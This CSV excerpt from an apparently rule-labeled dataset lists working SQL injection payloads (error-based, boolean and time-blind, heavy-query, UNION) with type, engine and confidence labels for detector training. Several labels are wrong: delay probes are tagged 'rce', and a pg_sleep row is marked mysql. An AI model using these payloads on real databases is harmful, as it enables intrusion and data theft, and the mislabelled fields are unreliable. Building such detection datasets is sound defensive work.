row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
3900,"1%"" and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ""%"" = """,1,,error_based,generic,0.95,convert ( int detected — error_based injection (priority 4) on generic,rule-based
3901,"1' ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
3902,"1 ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",1,,rce,generic,0.95,0x544d5a4c detected — rce injection (priority 1) on generic,rule-based
3903,"1'+ ( select 'nmhy' where 2919 = 2919 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
3904,1'|| ( select 'boxx' where 2038 = 2038 and 9198 = 9198--,1,,boolean_blind,generic,0.95,2038 = 2038 and detected — boolean_blind injection (priority 8) on generic,rule-based
3905,"1%"" ) and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
3906,"-4304' where 1005 = 1005 union all select 1005,1005#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3907,"1 ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) )",1,,rce,generic,0.95,0x76555642 detected — rce injection (priority 1) on generic,rule-based
3908,1'+ ( select 'zjvx' where 4683 = 4683 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) ) +',1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
3909,"1%' ) ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ( '%' = '",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
3910,"1'|| ( select 'txyy' where 6500 = 6500 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) ) ||'",1,,rce,generic,0.95,0x52515a50 detected — rce injection (priority 1) on generic,rule-based
3911,"1 ) where 8164 = 8164 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
